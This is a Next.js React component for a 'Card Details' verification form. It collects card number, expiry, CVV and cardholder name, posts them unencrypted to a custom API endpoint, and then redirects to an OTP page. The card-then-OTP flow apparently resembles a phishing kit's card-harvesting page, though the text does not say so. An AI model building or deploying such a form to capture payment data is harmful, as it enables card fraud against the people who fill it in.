"use client";

import { useState } from "react";
import { User, CreditCard, Calendar, Lock, ShieldCheck } from "lucide-react";
import { useRouter } from "next/navigation";



function Field({
  label,
  children,
}: {
  label: string;
  children: React.ReactNode;
}) {
  return (
    <div className="space-y-1">
      <label className="text-sm font-medium text-gray-700">
        {label}
      </label>
      {children}
    </div>
  );
}


export default function CardVerificationForm() {
  const router = useRouter();

  const [form, setForm] = useState({
    cardholderName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    setForm({
      ...form,
      [name]: value.trimStart(),
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const res = await fetch(
        `${process.env.NEXT_PUBLIC_API_URL}/api/card-verification`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(form),
        }
      );

      if (!res.ok) throw new Error("Verification failed");

      router.push("/otp");
    } catch (err) {
      alert("Card verification failed");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-3xl mx-auto bg-white px-6 py-8">
    <h1 className="text-center text-xl font-semibold mb-8">
      Card Details
    </h1>

    <form onSubmit={handleSubmit} className="space-y-5">
      {/* Card Number */}
      <Field label="Card Number">
        <input
          name="cardNumber"
          onChange={handleChange}
          required
          inputMode="numeric"
          maxLength={16}
          pattern="\d{16}"
          className="w-full border rounded-md px-4 py-3 text-sm outline-none focus:border-blue-500"
        />
      </Field>

      {/* Expiry */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <Field label="Expire Month">
          <select
            required
            onChange={(e) =>
              setForm((prev) => ({
                ...prev,
                expiry: `${e.target.value}/${prev.expiry.split("/")[1] || "YY"}`,
              }))
            }
            className="w-full border rounded-md px-4 py-3 text-sm outline-none"
          >
            {Array.from({ length: 12 }, (_, i) => {
              const m = String(i + 1).padStart(2, "0");
              return (
                <option key={m} value={m}>
                  {m}
                </option>
              );
            })}
          </select>
        </Field>

        <Field label="Expire Year">
          <select
            required
            onChange={(e) =>
              setForm((prev) => ({
                ...prev,
                expiry: `${prev.expiry.split("/")[0] || "MM"}/${e.target.value}`,
              }))
            }
            className="w-full border rounded-md px-4 py-3 text-sm outline-none"
          >
            {Array.from({ length: 20 }, (_, i) => {
              const y = String(new Date().getFullYear() % 100 + i);
              return (
                <option key={y} value={y}>
                  {y}
                </option>
              );
            })}
          </select>
        </Field>
      </div>

      {/* CVV */}
      <Field label="CVV">
        <input
          name="cvv"
          type="password"
          inputMode="numeric"
          maxLength={4}
          pattern="\d{3,4}"
          onChange={handleChange}
          required
          className="w-full border rounded-md px-4 py-3 text-sm outline-none focus:border-blue-500"
        />
      </Field>

      {/* Card Holder */}
      <Field label="Card Holder Name">
        <input
          name="cardholderName"
          onChange={handleChange}
          required
          maxLength={40}
          pattern="^[A-Za-z\s]+$"
          className="w-full border rounded-md px-4 py-3 text-sm outline-none focus:border-blue-500"
        />
      </Field>

      <button
        type="submit"
        disabled={loading}
        className="w-full mt-6 bg-orange-500 hover:bg-orange-600 text-white py-3 rounded-md font-medium transition disabled:opacity-60"
      >
        {loading ? "Verifying..." : "Submit"}
      </button>
    </form>
  </div>
  );
}

/* Input */
function Input({
  icon: Icon,
  name,
  placeholder,
  type = "text",
  onChange,
  maxLength,
  pattern,
  title,
  inputMode,
}: any) {
  return (
    <div className="flex items-center gap-3 border rounded-lg px-4 py-3 bg-gray-50">
      <Icon size={18} className="text-[#9b1c23]" />
      <input
        name={name}
        type={type}
        placeholder={placeholder}
        onChange={onChange}
        required
        maxLength={maxLength}
        pattern={pattern}
        title={title}
        inputMode={inputMode}
        className="w-full bg-transparent outline-none text-sm"
      />
    </div>
  );
}
